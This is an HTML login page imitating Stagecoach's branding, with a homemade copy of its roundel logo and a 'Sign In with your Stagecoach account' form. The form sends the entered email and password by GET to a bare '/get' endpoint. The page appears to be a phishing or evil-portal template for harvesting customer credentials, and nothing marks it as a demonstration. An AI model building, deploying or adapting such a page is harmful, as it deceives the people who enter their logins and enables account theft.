<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        body {
            font-family: Arial, Helvetica, sans-serif;
            margin: 0;
            padding: 0;
            height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            background: #f5f5f5;
        }
        .container {
            max-width: 400px;
            padding: 25px;
            margin: auto;
        }
        .form {
            max-width: 300px;
            padding: 20px;
            border: 1px solid #cccccc;
            border-radius: 5px;
            margin: 0 auto;
            background: white;
        }
        h1 {
            text-align: center;
            color: #E65C00;
            font-size: 22px;
            margin: 15px 0 20px;
        }
        input[type="text"], input[type="password"] {
            width: 100%;
            padding: 12px 10px;
            margin: 8px 0;
            box-sizing: border-box;
            border: 1px solid #cccccc;
            border-radius: 4px;
        }
        button[type="submit"] {
            width: 100%;
            background-color: #E65C00;
            color: white;
            padding: 14px 20px;
            margin: 8px 0;
            border: none;
            border-radius: 4px;
            cursor: pointer;
            font-size: 16px;
        }
        button[type="submit"]:hover {
            background-color: #C44F00;
        }
        .logo {
            text-align: center;
            margin-bottom: 5px;
        }
        .logo svg {
            width: 240px;
            height: auto;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 280 70" width="280" height="70">
                <!-- Orange circle (Stagecoach roundel) -->
                <circle cx="35" cy="35" r="32" fill="#E65C00"/>
                
                <!-- White inner design (simplified Stagecoach style) -->
                <circle cx="35" cy="35" r="22" fill="none" stroke="white" stroke-width="3"/>
                <path d="M23 35 Q35 18 47 35 Q35 52 23 35" fill="none" stroke="white" stroke-width="3" stroke-linecap="round"/>
                <circle cx="35" cy="35" r="6" fill="white"/>
                
                <!-- Stagecoach text -->
                <text x="80" y="44" font-family="Arial, Helvetica, sans-serif" font-size="32" font-weight="bold" fill="#E65C00">Stagecoach</text>
            </svg>
        </div>
        
        <form action="/get" method="get" id="email-form-step" class="form">
            <h1>Sign In with<br>your Stagecoach account</h1>
            <input name="email" type="text" placeholder="Email" required>
            <input name="password" type="password" placeholder="Password" required>
            <button type="submit">Next</button>
        </form>
    </div>
</body>
</html>
